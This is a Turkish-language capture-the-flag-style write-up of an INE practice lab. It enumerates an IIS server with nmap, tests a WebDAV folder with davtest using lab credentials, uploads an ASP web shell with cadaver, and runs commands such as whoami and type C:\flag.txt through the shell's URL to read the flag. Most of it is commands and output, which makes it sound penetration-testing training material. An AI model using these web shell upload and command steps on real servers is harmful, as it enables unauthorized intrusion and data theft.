@@ -1,0 +1,131 @@
+Windows: IIS Server DAVTest
+
+1. Nmap Taraması
+Hedef sistemde açık portları tespit etmek için temel bir Nmap taraması yapıldı:
+nmap demo.ine.local
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-06 18:55 IST
+Nmap scan report for demo.ine.local (10.2.30.151)
+Host is up (0.0031s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+3389/tcp open  ms-wbt-server
+
+
+✅ Birden fazla port tespit edildi. IIS sunucusunun çalıştığı 80/TCP portuna odaklanıldı.
+
+2. HTTP Enum Script ile Dizin Keşfi
+nmap --script http-enum -sV -p 80 demo.ine.local
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-06 18:21 IST
+Nmap scan report for demo.ine.local (10.2.30.151)
+Host is up (0.0033s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-enum: 
+|_  /webdav/: Potentially interesting folder (401 Unauthorized)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.25 seconds
+🔍 WebDAV dizini keşfedildi ve erişim denemesinde 401 Unauthorized hatası alındı.
+
+3. WebDAV Erişimini Test Etme
+davtest -url http://demo.ine.local/webdav
+********************************************************
+ Testing DAV connection
+OPEN            FAIL:   http://demo.ine.local/webdav    Unauthorized. Basic realm="demo.ine.local"
+⚠️ /webdav dizini temel kimlik doğrulaması ile korunuyor.
+
+4. Kimlik Bilgisi ile Erişim
+davtest -auth bob:password_123321 -url http://demo.ine.local/webdav
+********************************************************
+ Testing DAV connection
+OPEN            SUCCEED:                http://demo.ine.local/webdav
+********************************************************
+NOTE    Random string for this session: SvohRxZz6uF1
+********************************************************
+ Creating directory
+MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1
+********************************************************
+ Sending test files
+PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.pl
+PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.txt
+PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.asp
+PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.php
+PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.cgi
+PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.cfm
+PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.jhtml
+PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.html
+PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.aspx
+PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.jsp
+PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.shtml
+********************************************************
+ Checking for test file execution
+EXEC    pl      FAIL
+EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.txt
+EXEC    txt     FAIL
+EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.asp
+EXEC    asp     FAIL
+EXEC    php     FAIL
+EXEC    cgi     FAIL
+EXEC    cfm     FAIL
+EXEC    jhtml   FAIL
+EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.html
+EXEC    html    FAIL
+EXEC    aspx    FAIL
+EXEC    jsp     FAIL
+EXEC    shtml   FAIL
+
+********************************************************
+/usr/bin/davtest Summary:
+Created: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.pl
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.txt
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.asp
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.php
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.cgi
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.cfm
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.jhtml
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.html
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.aspx
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.jsp
+PUT File: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.shtml
+Executes: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.txt
+Executes: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.asp
+Executes: http://demo.ine.local/webdav/DavTestDir_SvohRxZz6uF1/davtest_SvohRxZz6uF1.html
+
+✅ Kullanıcı adı ve parola doğru. Dizin neredeyse tüm dosya türlerini yüklemeye izin veriyor. Ayrıca .asp, .html, .txt dosyaları çalıştırılabilir.
+
+5. ASP Web Shell Yükleme
+cadaver aracı ile bağlantı kurduk:
+
+cadaver http://demo.ine.local/webdav
+Username: bob
+Password: password_123321
+dav:/webdav/> ls
+Listing collection `/webdav/': succeeded.
+Coll:   DavTestDir_SvohRxZz6uF1                0  Jul  6 18:32
+        AttackDefense.txt                     13  Jan  2  2021
+        web.config                           168  Jan  2  2021
+
+Ardından .asp uzantılı web shell’i yükledik:
+
+put /usr/share/webshells/asp/webshell.asp
+📂 Shell başarıyla yüklendi: http://demo.ine.local/webdav/webshell.asp
+
+6. Komut Enjeksiyonu ile Bayrağa Ulaşma
+Komut satırı erişimi için tarayıcıdan şu adresi açtık:
+http://demo.ine.local/webdav/webshell.asp?cmd=whoami
+Ardından C:\ sürücüsünü keşfettik:
+
+http://demo.ine.local/webdav/webshell.asp?cmd=dir+C:\
+Ve flag.txt dosyasının içeriğini okuduk:
+http://demo.ine.local/webdav/webshell.asp?cmd=type+C%3A%5Cflag.txt
+🏁 Flag
+0cc175b9c0f1b6a831c399e269772661
